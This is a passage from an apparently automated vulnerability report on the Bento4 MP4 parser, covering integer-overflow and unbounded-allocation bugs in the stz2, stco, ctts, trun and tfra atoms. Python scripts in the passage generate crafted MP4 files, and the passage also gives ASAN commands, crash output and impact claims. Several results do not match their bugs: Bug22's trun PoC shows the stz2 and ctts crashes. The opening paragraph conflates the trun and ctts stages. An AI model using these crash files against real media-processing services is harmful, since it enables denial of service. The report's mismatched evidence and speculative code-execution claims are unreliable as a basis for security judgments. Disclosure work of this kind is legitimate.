An attacker who supplies a crafted MP4 file with a trun atom whose `sample_count` field is set to `0x10000000` can cause `AP4_TrunAtom::AP4_TrunAtom()` to silently fail the backing-array allocation and subsequently corrupt the heap through a NULL-pointer dereference loop, leading to heap-buffer-overflow confirmed by ASAN at the ctts parsing stage. This vulnerability is exposed by any invocation of `mp42aac` on an untrusted MP4 file and requires no authentication or special privileges beyond the ability to supply the input file. The immediate consequence is a reliable denial of service crash, and on 32-bit platforms the integer overflow in the capacity calculation additionally creates a heap-buffer-overflow condition that may be exploitable for arbitrary code execution.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4ContainerAtom_h#002 -->
<!-- DEDUP: AP4_TrunAtom::AP4_TrunAtom::CWE-476 -->

## Bug19: AP4_Stz2Atom Integer Overflow Leading to Heap Buffer Over-read

In `AP4_Stz2Atom::AP4_Stz2Atom()` in `Ap4Stz2Atom.cpp`, the expression `table_size = (sample_count * m_FieldSize + 7) / 8` performs a 32-bit unsigned multiplication that wraps to zero when `field_size=16` and `sample_count=0x10000000`, bypassing the bounds check and causing the subsequent loop to read 268,435,456 entries from a zero-byte heap allocation.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTPUT_FILE = "poc_input.mp4"


def box(box_type, payload):
    if isinstance(box_type, str):
        box_type = box_type.encode('ascii')
    size = 8 + len(payload)
    return struct.pack('>I', size) + box_type + payload


def fullbox(box_type, version, flags, payload):
    return box(box_type, struct.pack('>B', version) + struct.pack('>I', flags)[1:] + payload)


def make_ftyp():
    payload = b'isom'
    payload += struct.pack('>I', 0x200)
    payload += b'isom'
    payload += b'iso2'
    payload += b'mp41'
    return box('ftyp', payload)


def make_mvhd():
    payload = struct.pack('>I', 0)
    payload += struct.pack('>I', 0)
    payload += struct.pack('>I', 1000)
    payload += struct.pack('>I', 1000)
    payload += struct.pack('>I', 0x00010000)
    payload += struct.pack('>H', 0x0100)
    payload += b'\x00' * 10
    payload += struct.pack('>I', 0x00010000) + struct.pack('>I', 0) + struct.pack('>I', 0)
    payload += struct.pack('>I', 0) + struct.pack('>I', 0x00010000) + struct.pack('>I', 0)
    payload += struct.pack('>I', 0) + struct.pack('>I', 0) + struct.pack('>I', 0x40000000)
    payload += b'\x00' * 24
    payload += struct.pack('>I', 2)
    return fullbox('mvhd', 0, 0, payload)


def make_tkhd():
    payload = struct.pack('>I', 0)
    payload += struct.pack('>I', 0)
    payload += struct.pack('>I', 1)
    payload += struct.pack('>I', 0)
    payload += struct.pack('>I', 1000)
    payload += b'\x00' * 8
    payload += struct.pack('>H', 0)
    payload += struct.pack('>H', 0)
    payload += struct.pack('>H', 0x0100)
    payload += struct.pack('>H', 0)
    payload += struct.pack('>I', 0x00010000) + struct.pack('>I', 0) + struct.pack('>I', 0)
    payload += struct.pack('>I', 0) + struct.pack('>I', 0x00010000) + struct.pack('>I', 0)
    payload += struct.pack('>I', 0) + struct.pack('>I', 0) + struct.pack('>I', 0x40000000)
    payload += struct.pack('>I', 0)
    payload += struct.pack('>I', 0)
    return fullbox('tkhd', 0, 3, payload)


def make_mdhd():
    payload = struct.pack('>I', 0)
    payload += struct.pack('>I', 0)
    payload += struct.pack('>I', 44100)
    payload += struct.pack('>I', 44100)
    payload += struct.pack('>H', 0x55C4)
    payload += struct.pack('>H', 0)
    return fullbox('mdhd', 0, 0, payload)


def make_hdlr():
    payload = struct.pack('>I', 0)
    payload += b'soun'
    payload += b'\x00' * 12
    payload += b'Sound Handler\x00'
    return fullbox('hdlr', 0, 0, payload)


def make_smhd():
    payload = struct.pack('>H', 0)
    payload += struct.pack('>H', 0)
    return fullbox('smhd', 0, 0, payload)


def make_dref():
    url_payload = b'\x00'
    url_entry = fullbox('url ', 0, 1, url_payload)
    dref_payload = struct.pack('>I', 1) + url_entry
    return fullbox('dref', 0, 0, dref_payload)


def make_dinf():
    return box('dinf', make_dref())


def make_stsd():
    se_reserved = b'\x00' * 6
    se_data_ref = struct.pack('>H', 1)
    audio_reserved = b'\x00' * 8
    channel_count = struct.pack('>H', 2)
    sample_size = struct.pack('>H', 16)
    pre_defined = struct.pack('>H', 0)
    reserved2 = struct.pack('>H', 0)
    sample_rate = struct.pack('>I', 44100 << 16)
    mp4a_payload = se_reserved + se_data_ref + audio_reserved + channel_count + sample_size + pre_defined + reserved2 + sample_rate
    mp4a_box = box('mp4a', mp4a_payload)
    stsd_payload = struct.pack('>I', 1) + mp4a_box
    return fullbox('stsd', 0, 0, stsd_payload)


def make_stts():
    return fullbox('stts', 0, 0, struct.pack('>I', 0))


def make_stsc():
    return fullbox('stsc', 0, 0, struct.pack('>I', 0))


def make_stsz():
    payload = struct.pack('>I', 0)
    payload += struct.pack('>I', 0)
    return fullbox('stsz', 0, 0, payload)


def make_stco():
    return fullbox('stco', 0, 0, struct.pack('>I', 0))


def make_stz2():
    box_type = bytes([0x73, 0x74, 0x7A, 0x32])  # 'stz2'
    version = 0
    flags = 0
    reserved = b'\x00\x00\x00'
    field_size = 16       # causes overflow: 0x10000000 * 16 = 0x100000000 -> wraps to 0
    sample_count = 0x10000000  # 268435456 samples

    payload = struct.pack('>B', version)
    payload += struct.pack('>I', flags)[1:]
    payload += reserved
    payload += struct.pack('>B', field_size)
    payload += struct.pack('>I', sample_count)
    # no entry data: forces OOB read from the zero-byte buffer

    size = 8 + len(payload)
    return struct.pack('>I', size) + box_type + payload


def make_stbl():
    payload = make_stsd()
    payload += make_stts()
    payload += make_stsc()
    payload += make_stsz()
    payload += make_stco()
    payload += make_stz2()
    return box('stbl', payload)


def make_minf():
    payload = make_smhd()
    payload += make_dinf()
    payload += make_stbl()
    return box('minf', payload)


def make_mdia():
    payload = make_mdhd()
    payload += make_hdlr()
    payload += make_minf()
    return box('mdia', payload)


def make_trak():
    payload = make_tkhd()
    payload += make_mdia()
    return box('trak', payload)


def make_moov():
    payload = make_mvhd()
    payload += make_trak()
    return box('moov', payload)


def main():
    mp4_data = make_ftyp()
    mp4_data += make_moov()
    with open(OUTPUT_FILE, 'wb') as f:
        f.write(mp4_data)
    print(f"Written {len(mp4_data)} bytes to {OUTPUT_FILE}")


if __name__ == '__main__':
    main()
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000191 at pc 0x5612d099bb62 bp 0x7fff8178f570 sp 0x7fff8178f560
READ of size 1 at heap address 0x502000000191 (past end of 0-byte buffer)
SUMMARY: AddressSanitizer: heap-buffer-overflow in AP4_Stz2Atom::AP4_Stz2Atom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&)

### Impact

An attacker can supply a crafted MP4 file containing a malicious `stz2` box to trigger a 268,435,456-iteration heap buffer over-read, leaking adjacent heap memory that may contain sensitive data such as pointers, keys, or other in-memory structures. The vulnerability is reachable through the standard mp42aac file-processing invocation on any untrusted MP4 input with no authentication or special privileges required. In the worst case the over-read causes a segmentation fault, resulting in denial of service of the conversion process.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4_cpp#001 -->
<!-- DEDUP: AP4_Stz2Atom::AP4_Stz2Atom::CWE-122 -->

## Bug20: AP4_StcoAtom Unsigned Integer Underflow Bypasses Bounds Check and Causes Heap-Buffer-Overflow

In `AP4_StcoAtom::AP4_StcoAtom()` in `Ap4StcoAtom.cpp`, the upper-bound check on `m_EntryCount` undergoes unsigned integer underflow when the atom `size` equals `AP4_FULL_ATOM_HEADER_SIZE` (12), allowing an attacker-controlled `entry_count` read from beyond the atom boundary to bypass the guard, trigger a multi-gigabyte heap allocation, and cause an out-of-bounds stream read that propagates to a confirmed heap-buffer-overflow in `AP4_CttsAtom::AP4_CttsAtom()`.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(type4, data=b''):
    return struct.pack('>I', 4 + 4 + len(data)) + type4 + data

def fullbox(type4, version, flags, data=b''):
    hdr = struct.pack('>I', (version << 24) | (flags & 0xFFFFFF))
    return box(type4, hdr + data)

# --- ftyp ---
ftyp_data = (
    b'isom'
    + struct.pack('>I', 0x00000200)
    + b'isom'
    + b'iso2'
    + b'mp41'
)
ftyp = box(b'ftyp', ftyp_data)

# --- mvhd (version 0) ---
mvhd_payload = (
    struct.pack('>I', 0)
    + struct.pack('>I', 0)
    + struct.pack('>I', 1000)
    + struct.pack('>I', 0)
    + struct.pack('>I', 0x00010000)
    + struct.pack('>H', 0x0100)
    + b'\x00' * 10
    + struct.pack('>9i', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
    + b'\x00' * 24
    + struct.pack('>I', 2)
)
mvhd = fullbox(b'mvhd', 0, 0, mvhd_payload)

# --- tkhd (version 0) ---
tkhd_payload = (
    struct.pack('>I', 0)
    + struct.pack('>I', 0)
    + struct.pack('>I', 1)
    + struct.pack('>I', 0)
    + struct.pack('>I', 0)
    + b'\x00' * 8
    + struct.pack('>H', 0)
    + struct.pack('>H', 1)
    + struct.pack('>H', 0x0100)
    + b'\x00' * 2
    + struct.pack('>9i', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
    + struct.pack('>I', 0)
    + struct.pack('>I', 0)
)
tkhd = fullbox(b'tkhd', 0, 3, tkhd_payload)

# --- mdhd (version 0) ---
mdhd_payload = (
    struct.pack('>I', 0)
    + struct.pack('>I', 0)
    + struct.pack('>I', 44100)
    + struct.pack('>I', 0)
    + struct.pack('>H', 0x55C4)
    + struct.pack('>H', 0)
)
mdhd = fullbox(b'mdhd', 0, 0, mdhd_payload)

# --- hdlr ---
hdlr_payload = (
    struct.pack('>I', 0)
    + b'soun'
    + b'\x00' * 12
    + b'SoundHandler\x00'
)
hdlr = fullbox(b'hdlr', 0, 0, hdlr_payload)

# --- smhd ---
smhd_payload = struct.pack('>H', 0) + struct.pack('>H', 0)
smhd = fullbox(b'smhd', 0, 0, smhd_payload)

# --- dref ---
url_entry = fullbox(b'url ', 0, 1, b'')
dref_payload = struct.pack('>I', 1) + url_entry
dref = fullbox(b'dref', 0, 0, dref_payload)

# --- dinf ---
dinf = box(b'dinf', dref)

# --- stsd ---
mp4a_payload = (
    b'\x00' * 6
    + struct.pack('>H', 1)
    + b'\x00' * 8
    + struct.pack('>H', 2)
    + struct.pack('>H', 16)
    + struct.pack('>H', 0)
    + struct.pack('>H', 0)
    + struct.pack('>I', 44100 << 16)
)
mp4a = box(b'mp4a', mp4a_payload)
stsd_payload = struct.pack('>I', 1) + mp4a
stsd = fullbox(b'stsd', 0, 0, stsd_payload)

# --- stts, stsc, stsz ---
stts = fullbox(b'stts', 0, 0, struct.pack('>I', 0))
stsc = fullbox(b'stsc', 0, 0, struct.pack('>I', 0))
stsz = fullbox(b'stsz', 0, 0, struct.pack('>II', 0, 0))

# --- Malicious stco atom (size=12, no payload room) ---
# size=12: 4(size)+4(type)+4(version+flags) = 12 bytes; no entry_count field declared.
# After reading stco's 12 bytes, the constructor reads entry_count from the next
# 4 bytes in the stream, which lie outside stco's declared boundary.
# Bounds check underflows: (12-12-4)/4 = 0xFFFFFFFC/4 = 0x3FFFFFFF.
# entry_count=0x10000000 does not exceed 0x3FFFFFFF so it passes unclamped.
# new AP4_UI32[0x10000000] attempts a ~1 GB allocation.
MALICIOUS_ENTRY_COUNT = 0x10000000
stco_raw = struct.pack('>I', 12) + b'stco' + struct.pack('>I', 0)
assert len(stco_raw) == 12

# 4 extra bytes placed inside stbl but beyond stco's declared end;
# stco constructor reads them as entry_count.
extra_bytes = struct.pack('>I', MALICIOUS_ENTRY_COUNT)

# --- Build stbl ---
stbl_payload = stsd + stts + stsc + stsz + stco_raw + extra_bytes
stbl = box(b'stbl', stbl_payload)

# --- minf, mdia, trak, moov ---
minf = box(b'minf', smhd + dinf + stbl)
mdia = box(b'mdia', mdhd + hdlr + minf)
trak = box(b'trak', tkhd + mdia)
moov = box(b'moov', mvhd + trak)

mp4_data = ftyp + moov

with open('poc_input.mp4', 'wb') as f:
    f.write(mp4_data)

print(f"Written {len(mp4_data)} bytes to poc_input.mp4")
print(f"stco declared size: 12 (no payload room)")
print(f"entry_count read from beyond stco boundary: 0x{MALICIOUS_ENTRY_COUNT:08X} = {MALICIOUS_ENTRY_COUNT}")
print(f"Underflow check: (12-12-4)/4 = 0x3FFFFFFF (unsigned underflow)")
print(f"Bypass: {MALICIOUS_ENTRY_COUNT} <= 0x3FFFFFFF -> entry_count NOT clamped")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000111 at pc 0x563f76e65094 bp 0x7fffcc2d79f0 sp 0x7fffcc2d79e0
READ of size 1 at 0x502000000111 thread T0
    #0 in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xaa1093)
    #1 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xaa2087)

### Impact

An attacker who supplies a crafted MP4 file can trigger an unsigned integer underflow in `AP4_StcoAtom::AP4_StcoAtom()` that bypasses the entry-count bounds check, causing a multi-gigabyte heap allocation followed by an out-of-bounds stream read that results in a confirmed heap-buffer-overflow one byte past an allocated region. The attack surface covers any invocation of mp42aac (or other Bento4 tools sharing the same parsing library) on an untrusted MP4 file, requiring no privileges or authentication. The immediate consequence is process termination (denial of service), and the out-of-bounds read across heap region boundaries may additionally expose adjacent heap metadata or application data to an attacker under favorable memory layout conditions.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4ContainerAtom_h#003 -->
<!-- DEDUP: AP4_StcoAtom::AP4_StcoAtom::CWE-191 -->

## Bug21: AP4_CttsAtom Integer Overflow Leading to Heap Buffer Over-read

In `AP4_CttsAtom::AP4_CttsAtom()` in `Ap4CttsAtom.cpp`, the constructor allocates a read buffer as `new unsigned char[entry_count * 8]` without validating that `entry_count` is bounded by the atom size, so when a crafted MP4 supplies `entry_count >= 0x20000000` the `uint32_t` multiplication wraps to zero, a zero-byte heap buffer is allocated, and the subsequent loop reads far past the allocation causing a heap buffer over-read.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(box_type, payload):
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type.encode() + payload

def fullbox(box_type, version, flags, payload):
    fb_payload = struct.pack(">B", version) + struct.pack(">I", flags)[1:] + payload
    return box(box_type, fb_payload)

def make_ftyp():
    payload = b"mp42"
    payload += struct.pack(">I", 0)
    payload += b"mp42" + b"isom"
    return box("ftyp", payload)

def make_mvhd():
    payload = struct.pack(">IIII", 0, 0, 1000, 0)
    payload += struct.pack(">I", 0x00010000)
    payload += struct.pack(">H", 0x0100)
    payload += b"\x00" * 10
    matrix = struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += matrix
    payload += b"\x00" * 24
    payload += struct.pack(">I", 2)
    return fullbox("mvhd", 0, 0, payload)

def make_tkhd():
    payload = struct.pack(">II", 0, 0)
    payload += struct.pack(">I", 1)
    payload += b"\x00" * 4
    payload += struct.pack(">I", 0)
    payload += b"\x00" * 8
    payload += struct.pack(">hh", 0, 0)
    payload += struct.pack(">H", 0x0100)
    payload += b"\x00" * 2
    matrix = struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += matrix
    payload += struct.pack(">II", 0, 0)
    return fullbox("tkhd", 0, 0x0f, payload)

def make_mdhd():
    payload = struct.pack(">IIII", 0, 0, 44100, 0)
    payload += struct.pack(">H", 0x15c7)
    payload += struct.pack(">H", 0)
    return fullbox("mdhd", 0, 0, payload)

def make_hdlr():
    payload = struct.pack(">I", 0)
    payload += b"soun"
    payload += b"\x00" * 12
    payload += b"\x00"
    return fullbox("hdlr", 0, 0, payload)

def make_smhd():
    payload = struct.pack(">HH", 0, 0)
    return fullbox("smhd", 0, 0, payload)

def make_dinf():
    url_entry = fullbox("url ", 0, 1, b"")
    dref_payload = struct.pack(">I", 1) + url_entry
    dref = fullbox("dref", 0, 0, dref_payload)
    return box("dinf", dref)

def make_stsd():
    payload = struct.pack(">I", 0)
    return fullbox("stsd", 0, 0, payload)

def make_stts():
    payload = struct.pack(">I", 0)
    return fullbox("stts", 0, 0, payload)

def make_ctts_malicious():
    ENTRY_COUNT = 0x20000000  # entry_count*8 overflows to 0 in uint32_t
    payload = struct.pack(">I", ENTRY_COUNT)
    return fullbox("ctts", 0, 0, payload)

def make_stsc():
    payload = struct.pack(">I", 0)
    return fullbox("stsc", 0, 0, payload)

def make_stsz():
    payload = struct.pack(">II", 0, 0)
    return fullbox("stsz", 0, 0, payload)

def make_stco():
    payload = struct.pack(">I", 0)
    return fullbox("stco", 0, 0, payload)

def make_stbl():
    payload = (make_stsd() + make_stts() + make_ctts_malicious() +
               make_stsc() + make_stsz() + make_stco())
    return box("stbl", payload)

def make_minf():
    payload = make_smhd() + make_dinf() + make_stbl()
    return box("minf", payload)

def make_mdia():
    payload = make_mdhd() + make_hdlr() + make_minf()
    return box("mdia", payload)

def make_trak():
    payload = make_tkhd() + make_mdia()
    return box("trak", payload)

def make_moov():
    payload = make_mvhd() + make_trak()
    return box("moov", payload)

ftyp = make_ftyp()
moov = make_moov()
mp4 = ftyp + moov

with open("poc_input.mp4", "wb") as f:
    f.write(mp4)

print(f"[+] Written {len(mp4)} bytes to poc_input.mp4")
print(f"[+] ctts entry_count = 0x20000000 -> entry_count*8 overflows to 0")
print(f"[+] Expected: heap buffer over-read in AP4_CttsAtom constructor loop")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5020000000f1 at pc 0x55d00e596094 bp 0x7ffc7cb3e2e0 sp 0x7ffc7cb3e2d0
READ of size 1 at 0x5020000000f1 thread T0
    #0 0x55d00e596093 in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xaa1093)
    #1 0x55d00e597087 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xaa2087)

### Impact

An attacker who can supply a crafted MP4 file to any invocation of mp42aac can trigger a heap buffer over-read in `AP4_CttsAtom::AP4_CttsAtom()`, which causes a process crash (denial of service) and may leak adjacent heap memory contents to a caller that inspects the parsed entry data (information disclosure). Because the overflowed allocation size is zero the over-read spans an unbounded range of heap memory, and on systems where heap layout is attacker-influenced the primitive could contribute to further memory corruption primitives.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4_cpp#002 -->
<!-- DEDUP: AP4_CttsAtom::AP4_CttsAtom::CWE-122 -->

## Bug22: AP4_TrunAtom Unchecked sample_count Causes Unbounded Allocation

In `AP4_TrunAtom::AP4_TrunAtom()` in `Ap4TrunAtom.cpp`, the attacker-controlled `sample_count` field read from a trun box is passed directly to `m_Entries.SetItemCount(sample_count)` without any check that it does not exceed the number of entries the box payload can actually contain, allowing a crafted value of `0x10000000` to trigger a multi-gigabyte allocation request that causes `std::bad_alloc` and process termination.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
PoC generator for AP4_TrunAtom Unchecked sample_count (vuln 005).
Sets sample_count=0x10000000 in a trun box to trigger unbounded allocation.
"""
import struct

def box(box_type, payload):
    size = 8 + len(payload)
    return struct.pack('>I', size) + box_type + payload

def fullbox(box_type, version, flags, payload):
    fb_header = bytes([version]) + struct.pack('>I', flags)[1:]
    return box(box_type, fb_header + payload)

def make_ftyp():
    payload = b'iso5' + struct.pack('>I', 0) + b'isom' + b'iso5' + b'mp41'
    return box(b'ftyp', payload)

def make_mvhd():
    payload = struct.pack('>IIII', 0, 0, 44100, 0)
    payload += struct.pack('>I', 0x00010000)
    payload += struct.pack('>H', 0x0100)
    payload += b'\x00' * 10
    payload += struct.pack('>9I', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
    payload += b'\x00' * 24
    payload += struct.pack('>I', 2)
    return fullbox(b'mvhd', 0, 0, payload)

def make_tkhd():
    payload = struct.pack('>IIII', 0, 0, 1, 0)
    payload += struct.pack('>I', 0)
    payload += b'\x00' * 8
    payload += struct.pack('>HH', 0, 0)
    payload += struct.pack('>H', 0x0100)
    payload += b'\x00' * 2
    payload += struct.pack('>9I', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
    payload += struct.pack('>II', 0, 0)
    return fullbox(b'tkhd', 0, 3, payload)

def make_mdhd():
    payload = struct.pack('>IIII', 0, 0, 44100, 0)
    payload += struct.pack('>HH', 0x55C4, 0)
    return fullbox(b'mdhd', 0, 0, payload)

def make_hdlr():
    payload = struct.pack('>I', 0)
    payload += b'soun'
    payload += b'\x00' * 12
    payload += b'SoundHandler\x00'
    return fullbox(b'hdlr', 0, 0, payload)

def make_smhd():
    payload = struct.pack('>HH', 0, 0)
    return fullbox(b'smhd', 0, 0, payload)

def make_dref():
    url_entry = fullbox(b'url ', 0, 1, b'')
    payload = struct.pack('>I', 1) + url_entry
    return fullbox(b'dref', 0, 0, payload)

def make_dinf():
    return box(b'dinf', make_dref())

def make_stsd():
    payload = struct.pack('>I', 0)
    return fullbox(b'stsd', 0, 0, payload)

def make_stts():
    payload = struct.pack('>I', 0)
    return fullbox(b'stts', 0, 0, payload)

def make_stsc():
    payload = struct.pack('>I', 0)
    return fullbox(b'stsc', 0, 0, payload)

def make_stsz():
    payload = struct.pack('>II', 0, 0)
    return fullbox(b'stsz', 0, 0, payload)

def make_stco():
    payload = struct.pack('>I', 0)
    return fullbox(b'stco', 0, 0, payload)

def make_stbl():
    payload = make_stsd() + make_stts() + make_stsc() + make_stsz() + make_stco()
    return box(b'stbl', payload)

def make_minf():
    payload = make_smhd() + make_dinf() + make_stbl()
    return box(b'minf', payload)

def make_mdia():
    payload = make_mdhd() + make_hdlr() + make_minf()
    return box(b'mdia', payload)

def make_trak():
    payload = make_tkhd() + make_mdia()
    return box(b'trak', payload)

def make_trex():
    payload = struct.pack('>IIIII', 1, 1, 0, 0, 0)
    return fullbox(b'trex', 0, 0, payload)

def make_mvex():
    return box(b'mvex', make_trex())

def make_moov():
    payload = make_mvhd() + make_mvex() + make_trak()
    return box(b'moov', payload)

def make_mfhd():
    payload = struct.pack('>I', 1)
    return fullbox(b'mfhd', 0, 0, payload)

def make_tfhd():
    payload = struct.pack('>I', 1)
    return fullbox(b'tfhd', 0, 0x000000, payload)

def make_trun_malicious():
    # flags=0x000000: no optional fields; sample_count triggers huge allocation
    SAMPLE_COUNT = 0x10000000
    payload = struct.pack('>I', SAMPLE_COUNT)
    return fullbox(b'trun', 0, 0x000000, payload)

def make_traf():
    payload = make_tfhd() + make_trun_malicious()
    return box(b'traf', payload)

def make_moof():
    payload = make_mfhd() + make_traf()
    return box(b'moof', payload)

def make_mdat():
    return box(b'mdat', b'')

mp4 = make_ftyp() + make_moov() + make_moof() + make_mdat()
with open('poc_input.mp4', 'wb') as f:
    f.write(mp4)
print(f"[+] Written {len(mp4)} bytes to poc_input.mp4")
print(f"[+] trun sample_count = 0x10000000 ({0x10000000})")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000191 at pc 0x5612d099bb62 bp 0x7fff8178f570 sp 0x7fff8178f560
SUMMARY: AddressSanitizer: heap-buffer-overflow (/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac+0xc51b61) in AP4_Stz2Atom::AP4_Stz2Atom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&)
ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5020000000f1 at pc 0x55d00e596094 bp 0x7ffc7cb3e2e0 sp 0x7ffc7cb3e2d0
SUMMARY: AddressSanitizer: heap-buffer-overflow (/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac+0xaa1093) in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&)

### Impact

An attacker who supplies a crafted MP4 file to any service invoking mp42aac can trigger an unbounded memory allocation request of several gigabytes in `AP4_TrunAtom::AP4_TrunAtom()`, causing the process to terminate with `std::bad_alloc` and constituting a reliable denial-of-service condition. On platforms or configurations where the allocator returns null instead of throwing, the unchecked return value of `SetItemCount` means subsequent array accesses in the entry-reading loop operate on an uninitialized or null pointer, potentially escalating to memory corruption. The attack surface covers any pipeline that parses untrusted fragmented MP4 input through Bento4.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4_cpp#005 -->
<!-- DEDUP: AP4_TrunAtom::AP4_TrunAtom::CWE-789 -->

## Bug23: AP4_TfraAtom Unchecked entry_count Causes Unbounded Memory Allocation

In `AP4_TfraAtom::AP4_TfraAtom()` in `Ap4TfraAtom.cpp`, the constructor passes the file-controlled `entry_count` field directly to `m_Entries.SetItemCount(entry_count)` without any bounds check, causing an attempt to allocate up to ~15 TB of heap memory and crashing the process with `std::bad_alloc`.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
PoC Generator — AP4_TfraAtom Unchecked entry_count
Triggers huge allocation via SetItemCount(0x10000000) -> bad_alloc / DoS
"""
import struct

OUT_FILE = "poc_input.mp4"


def box(box_type: bytes, payload: bytes) -> bytes:
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type + payload


def make_ftyp() -> bytes:
    payload = b"isom" + struct.pack(">I", 0) + b"isom"
    return box(b"ftyp", payload)


def make_mvhd() -> bytes:
    payload = (
        struct.pack(">I", 0)
        + struct.pack(">I", 0)
        + struct.pack(">I", 0)
        + struct.pack(">I", 1000)
        + struct.pack(">I", 0)
        + struct.pack(">I", 0x00010000)
        + struct.pack(">H", 0x0100)
        + b"\x00" * 10
        + struct.pack(">9I",
                      0x00010000, 0, 0,
                      0, 0x00010000, 0,
                      0, 0, 0x40000000)
        + b"\x00" * 24
        + struct.pack(">I", 2)
    )
    return box(b"mvhd", payload)


def make_moov() -> bytes:
    return box(b"moov", make_mvhd())


def make_tfra() -> bytes:
    payload = (
        b"\x00"
        + b"\x00\x00\x00"
        + struct.pack(">I", 1)
        + struct.pack(">I", 0x00000000)
        + struct.pack(">I", 0x10000000)  # entry_count = 268435456 -- the trigger
        # No entry bytes -- parser allocates before reading entries
    )
    return box(b"tfra", payload)


def make_mfro(mfra_size: int) -> bytes:
    payload = struct.pack(">I", mfra_size)
    return box(b"mfro", payload)


def make_mfra() -> bytes:
    tfra = make_tfra()
    mfra_size = 8 + len(tfra) + 16
    mfro = make_mfro(mfra_size)
    return box(b"mfra", tfra + mfro)


def main():
    ftyp = make_ftyp()
    moov = make_moov()
    mfra = make_mfra()

    data = ftyp + moov + mfra

    with open(OUT_FILE, "wb") as f:
        f.write(data)

    print(f"[+] Written {len(data)} bytes to {OUT_FILE}")
    print(f"    tfra entry_count = 0x10000000 ({0x10000000} entries)")
    print(f"    Expected: bad_alloc / abort when mp42aac parses mfra/tfra")


if __name__ == "__main__":
    main()
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** AddressSanitizer: hard rss limit exhausted (512Mb vs 546Mb)
ERROR: AddressSanitizer failed to allocate 0xdfff0001000 (15392894357504) bytes at address 2008fff7000 (errno: 12)
Process exit: SIGABRT (signal 6) with exit code 134. The crash occurs in AP4_TfraAtom::AP4_TfraAtom() at Ap4TfraAtom.cpp:88 when SetItemCount(0x10000000) attempts a ~15 TB heap allocation.

### Impact

An attacker can cause unconditional denial of service by supplying a single crafted MP4 file containing a tfra box with an inflated `entry_count` field, crashing any process that invokes mp42aac or any application linked against the Bento4 library to parse MP4 files. The attack surface is any invocation of mp42aac on an untrusted MP4 file, with no authentication or special privileges required. On allocators that do not throw `std::bad_alloc`, the ignored return value of `SetItemCount` could lead to subsequent out-of-bounds writes into a null or undersized buffer, potentially enabling memory corruption beyond a pure denial of service.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4_cpp#006 -->
<!-- DEDUP: AP4_TfraAtom::AP4_TfraAtom::CWE-789 -->

## Bug24: Heap Buffer Overflow via Integer Underflow in AP4_Dac4Atom::Create

